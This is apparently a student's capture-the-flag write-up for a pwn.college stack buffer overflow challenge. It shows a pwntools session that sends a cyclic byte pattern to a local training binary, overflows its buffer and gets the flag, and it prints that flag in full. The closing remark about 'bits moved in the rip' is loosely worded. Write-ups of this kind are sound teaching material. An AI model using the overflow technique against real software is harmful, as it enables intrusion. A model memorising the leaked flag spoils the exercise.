# Your first overflow hard
in this we needed to overflow the buffer
cyclic() generates a unique, non-repeating pattern of bytes (letters).
Each 4-byte (or 8-byte) sequence in that pattern is unique, so when your program crashes and you check the value of $RIP, you can find exactly how many bytes it took to reach that point.

## flag 
pwn.college{8xXY9mcuWfVWYZA_gXKhBfe5XgR.0FM5IDL5gDN1czW}

## Solve
```bash
:/challenge$ ipython
Python 3.12.11 (main, Jun  3 2025, 15:41:47) [GCC 14.2.1 20250322]
Type 'copyright', 'credits' or 'license' for more information
IPython 9.2.0 -- An enhanced Interactive Python. Type '?' for help.
Tip: You can change the editing mode of IPython to behave more like vi, or emacs.

In [1]: from pwn import *

In [2]: r=process('./binary-exploitation-first-overflow')
[x] Starting local process './binary-exploitation-first-overflow'
[+] Starting local process './binary-exploitation-first-overflow': pid 228

In [3]: r.send(cyclic(200))

In [4]: r.readall()
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './binary-exploitation-first-overflow' stopped with exit code -6 (SIGABRT) (pid 228)
[x] Receiving all data: 178B
[+] Receiving all data: Done (178B)
Out[4]: b'Send your payload (up to 4096 bytes)!\nYou win! Here is your flag:\npwn.college{8xXY9mcuWfVWYZA_gXKhBfe5XgR.0FM5IDL5gDN1czW}\n\n\nGoodbye!\n*** stack smashing detected ***: terminated\n'

```

- we send the cyclic to find how many bits moved in the rip and see the bits needed to overflow the buffer
## Reference 
None

